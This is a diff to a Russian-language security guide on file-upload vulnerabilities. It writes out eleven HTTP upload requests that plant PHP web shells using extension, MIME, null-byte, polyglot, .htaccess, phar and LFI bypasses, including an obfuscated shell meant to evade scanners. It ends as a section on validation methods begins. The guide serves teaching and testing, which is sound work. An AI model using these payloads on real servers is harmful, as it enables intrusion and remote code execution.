@@ -447,7 +447,10 @@ if (in_array($ext, ['jpg', 'png', 'gif'])) {
 **Реальная эксплуатация:**
 
 **1. Прямая загрузка PHP shell:**
-```text
+
+Если нет валидации расширения и типа файла, можно напрямую загрузить .php файл с кодом.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -459,43 +462,52 @@ Content-Type: application/octet-stream
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary--
 ```
-Если нет валидации, файл загружается напрямую.
-Доступ: http://target.com/uploads/shell.php?cmd=whoami
+
+Доступ к загруженному файлу: `http://target.com/uploads/shell.php?cmd=whoami`
 
 **2. Обход через двойное расширение:**
-```text
+
+Некоторые серверы (особенно с неправильной конфигурацией Apache) обрабатывают файлы справа налево. Файл `shell.php.jpg` может быть интерпретирован как PHP, если сервер не распознает .jpg.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 ------WebKitFormBoundary
-Content-Disposition: form-data; name="file"; filename="shell.php.jpg" //<= Добавляем двойное расширение
+Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
 Content-Type: image/jpeg
 
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary--
 ```
-Некоторые серверы обрабатывают первое расширение (.php).
-Доступ: http://target.com/uploads/shell.php.jpg?cmd=id
+
+Доступ к загруженному файлу: `http://target.com/uploads/shell.php.jpg?cmd=id`
 
 **3. Обход через null byte (PHP < 5.3.4):**
-```text
+
+В старых версиях PHP null byte (%00) обрезает строку. Файл с именем `shell.php%00.jpg` будет сохранён как `shell.php`, обходя проверку расширения.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 ------WebKitFormBoundary
-Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg" //<= Добавляем null byte
+Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
 Content-Type: image/jpeg
 
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary--
 ```
-PHP обрезает имя файла после null byte (%00), сохраняется как shell.php.
-Доступ: http://target.com/uploads/shell.php?cmd=whoami
+
+Доступ к загруженному файлу: `http://target.com/uploads/shell.php?cmd=whoami`
 
 **4. Обход через Content-Type manipulation:**
-```text
+
+Если проверка основана только на MIME type из заголовка `Content-Type`, его можно подделать. Сервер получит `image/jpeg`, но файл будет содержать PHP код.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -508,8 +520,13 @@ Content-Type: image/jpeg    <= Подделываем MIME type
 ------WebKitFormBoundary--
 ```
 
-**5. Обход через case-sensitivity (Windows серверы):**
-```text
+Доступ к загруженному файлу: `http://target.com/uploads/shell.php?cmd=whoami`
+
+**5. Обход через case-sensitivity:**
+
+Если валидация проверяет только `.php` в нижнем регистре, можно использовать `.PhP`, `.pHp`, `.PHP` для обхода. Работает при слабой проверке расширения в коде или неправильной конфигурации веб-сервера (case-insensitive FilesMatch в Apache).
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -521,11 +538,14 @@ Content-Type: application/octet-stream
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary--
 ```
-Windows не различает регистр расширений: .php = .PhP = .pHp
-Доступ: http://target.com/uploads/shell.PhP?cmd=whoami
+
+Доступ к загруженному файлу: `http://target.com/uploads/shell.PhP?cmd=whoami`
 
 **6. Обход через точку в конце:**
-```text
+
+Многие файловые системы и обработчики автоматически удаляют завершающую точку из имени файла. Файл `shell.php.` сохраняется как `shell.php`, обходя проверку расширения.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -537,32 +557,52 @@ Content-Type: application/octet-stream
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary--
 ```
-ОС автоматически удаляет точку в конце имени файла, сохраняется как shell.php
-Работает на Windows и многих конфигурациях Linux.
-Доступ: http://target.com/uploads/shell.php?cmd=id
+
+Доступ к загруженному файлу: `http://target.com/uploads/shell.php?cmd=id`
 
 **7. Комбинация File Upload + LFI:**
-```php
-// Загружаем файл с PHP кодом под безопасным расширением
-// Имя файла: backdoor.txt
-// Содержимое: <?php system($_GET['c']); ?>
 
-// Затем используем LFI:
-?page=uploads/backdoor.txt&c=whoami
-// include() выполнит PHP код из .txt файла!
+Загружаем файл с PHP кодом под безопасным расширением (например, .txt), который не выполняется напрямую, а затем включаем его через LFI уязвимость. `include()` выполнит PHP код независимо от расширения.
+
+```yaml
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="backdoor.txt"
+Content-Type: text/plain
+
+<?php system($_GET['c']); ?>
+------WebKitFormBoundary--
 ```
+
+Доступ через LFI: `http://target.com/?page=uploads/backdoor.txt&c=whoami`
 
 **8. Phar + File Upload (advanced):**
-```bash
-# Создаём .phar с вредоносным объектом
-# Загружаем как .jpg (обходим фильтры)
-# Затем используем phar wrapper:
-?file=phar://uploads/image.jpg/test
-# Десериализация → RCE
+
+PHAR архив может содержать сериализованные PHP объекты. При использовании `phar://` wrapper происходит автоматическая десериализация, что может привести к RCE через POP chain. Загружаем .phar файл под видом изображения.
+
+```yaml
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="exploit.jpg"
+Content-Type: image/jpeg
+
+[Binary PHAR content with malicious serialized object]
+------WebKitFormBoundary--
 ```
 
+Доступ через phar wrapper: `http://target.com/?file=phar://uploads/exploit.jpg/test`
+
 **9. Polyglot файлы (PHP + image):**
-```text
+
+Файл является одновременно валидным изображением (проходит `getimagesize()`) И содержит PHP код. Начинается с GIF header, но PHP интерпретирует всё содержимое.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -575,11 +615,14 @@ GIF89a    <= Валидный GIF header
 <?php system($_GET['c']); ?>
 ------WebKitFormBoundary--
 ```
-Файл проходит проверку getimagesize(), но PHP интерпретирует код.
-Доступ: /uploads/avatar.gif?c=whoami
+
+Доступ к загруженному файлу: `http://target.com/uploads/avatar.gif?c=whoami`
 
 **10. .htaccess upload для изменения конфигурации:**
-```text
+
+На Apache серверах файл `.htaccess` управляет конфигурацией директории. Загрузив его, можно заставить сервер интерпретировать .jpg файлы как PHP.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -591,11 +634,14 @@ Content-Type: text/plain
 AddType application/x-httpd-php .jpg
 ------WebKitFormBoundary--
 ```
-Теперь все .jpg в uploads/ обрабатываются как PHP!
-Затем загружаем shell.jpg с PHP кодом → выполняется.
+
+После этого все .jpg файлы в `uploads/` обрабатываются как PHP. Загружаем `shell.jpg` с кодом и получаем выполнение.
 
 **11. Web shell обфускация:**
-```text
+
+Обфускация кода для обхода антивирусных сканеров, WAF и систем обнаружения. Строки декодируются в runtime, сигнатуры не срабатывают.
+
+```yaml
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -611,15 +657,15 @@ $a($b);
 ?>
 ------WebKitFormBoundary--
 ```
-Обход сканеров и WAF через обфускацию.
-Доступ: /uploads/image.php?cmd=whoami
+
+Доступ к загруженному файлу: `http://target.com/uploads/image.php?cmd=whoami`
 
 **Техники валидации (что проверять):**
 
 **Слабые методы (легко обойти):**
-- ❌ MIME type (`$_FILES['file']['type']`) - контролируется клиентом
-- ❌ Расширение без whitelist - легко обойти через .php5, .phtml
-- ❌ Проверка только первых байтов - polyglot файлы
+- MIME type (`$_FILES['file']['type']`) - контролируется клиентом
+- Расширение без whitelist - легко обойти через .php5, .phtml
+- Проверка только первых байтов - polyglot файлы
 
 **Правильные методы:**
 ```php
